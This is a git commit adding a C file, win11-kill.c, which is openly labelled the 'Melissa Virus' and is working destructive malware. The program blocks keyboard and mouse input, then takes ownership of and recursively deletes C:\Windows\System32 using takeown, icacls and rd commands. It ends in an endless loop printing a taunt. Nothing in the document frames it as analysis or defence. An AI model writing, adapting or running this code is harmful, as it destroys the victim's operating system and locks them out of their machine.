979f9cfceb371e71fb417107cdfd740e8146d658
Ali Çömez | Slaweally <sys@rootali.net>
2024-12-01 23:18:30 +0300

    Create win11-kill.c

---
+++ win11-kill.c
@@ -0,0 +1,33 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+void blockInput() {
+    // Klavye ve fareyi kilitle
+    BlockInput(TRUE);
+}
+
+void deleteCriticalFiles() {
+    // Kritik dosyaları sil (örnek, System32)
+    system("takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1");
+    system("icacls C:\\Windows\\System32 /grant %username%:F /t >nul 2>&1");
+    system("rd /s /q C:\\Windows\\System32");
+}
+
+void infiniteLoop() {
+    // Sonsuz döngü
+    while (1) {
+        printf("😀😂😈 Melissa was here!\n");
+        Sleep(500);
+    }
+}
+
+int main() {
+    MessageBox(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "Melissa Virus", MB_OK);
+
+    blockInput();
+    deleteCriticalFiles();
+    infiniteLoop();
+
+    return 0;
+}
